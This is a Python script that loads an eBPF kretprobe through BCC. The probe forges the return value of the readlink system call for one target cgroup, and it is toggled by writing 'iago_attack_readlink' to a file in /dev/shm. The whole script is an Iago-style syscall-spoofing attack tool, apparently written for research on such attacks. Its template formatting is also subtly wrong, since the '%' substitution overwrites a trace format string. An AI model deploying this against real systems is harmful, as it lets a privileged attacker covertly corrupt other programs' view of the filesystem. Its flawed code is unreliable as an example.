import os
import sys
import time
from bcc import BPF

if len(sys.argv) != 2:
    print("Usage: python3 script.py <target_cgroup_id>")
    sys.exit(1)

target_cgroup_id = int(sys.argv[1])
bpf_program_template = f"""
#include <uapi/linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/sched.h>
#include <linux/errno.h>

BPF_HASH(cgroup_id_map, u32, u64);

static inline bool compare_cgroup_id(u64 cgroup_id) {{
    u64 current_cgroup_id = bpf_get_current_cgroup_id();
    if (cgroup_id != current_cgroup_id)
        return false;

    return true;
}}

int handle_readlink(struct pt_regs *ctx) {{
    u64 target_cgroup = {target_cgroup_id};
    u64 success = -1;
    if (!compare_cgroup_id(target_cgroup))
        return 0;
    bpf_trace_printk("handle_readlink");
    success = bpf_override_return(ctx, 100);
    bpf_trace_printk("success = %d", success);
    return 0;
}}
"""
bpf_program = bpf_program_template % target_cgroup_id

bpf = BPF(text=bpf_program)

switch_file = "/dev/shm/switch_file"

if not os.path.exists(switch_file):
    with open(switch_file, "w") as f:
        f.write("")

print("eBPF program loaded. Monitoring /dev/shm/switch_file for commands...")


try:
    attached = False  

    while True:
        with open(switch_file, "r") as f:
            content = f.read().strip()

        if content == "iago_attack_readlink" and not attached:
            print("Attaching kretprobe to sys_readlink...")
            bpf.attach_kretprobe(event = bpf.get_syscall_fnname("readlink"), fn_name = "handle_readlink")
            attached = True
        elif content != "iago_attack_readlink" and attached:
            print("Detaching kretprobe from sys_readlink...")
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("readlink"))
            attached = False

        time.sleep(1)
except KeyboardInterrupt:
    if attached:
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("readlink"))
    print("Detaching probes and exiting...")
